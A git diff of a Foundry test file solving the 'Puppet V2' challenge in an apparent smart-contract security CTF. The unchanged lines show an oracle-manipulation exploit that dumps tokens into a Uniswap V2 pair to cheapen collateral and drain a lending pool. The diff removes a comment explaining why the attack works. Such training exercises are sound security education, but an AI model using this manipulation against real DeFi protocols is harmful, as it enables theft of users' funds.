@@ -98,7 +98,6 @@ contract PuppetV2Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV2() public checkSolvedByPlayer {
-        
         token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
         
         address[] memory path = new address[](2);
@@ -114,7 +113,6 @@ contract PuppetV2Challenge is Test {
             player,               
             block.timestamp + 1   
         );
-        
         
         // Check required WETH then borrow cheaply
         uint256 poolTokens = token.balanceOf(address(lendingPool));
@@ -132,8 +130,6 @@ contract PuppetV2Challenge is Test {
         
         uint256 borrowedTokens = token.balanceOf(player);
         token.transfer(recovery, borrowedTokens);
-
-        //this is why the exploit works: the pool 'calculateDepositOfWETHRequired()' can be manipulated by selling a lot of tokens in the pool
     }
 
     /**
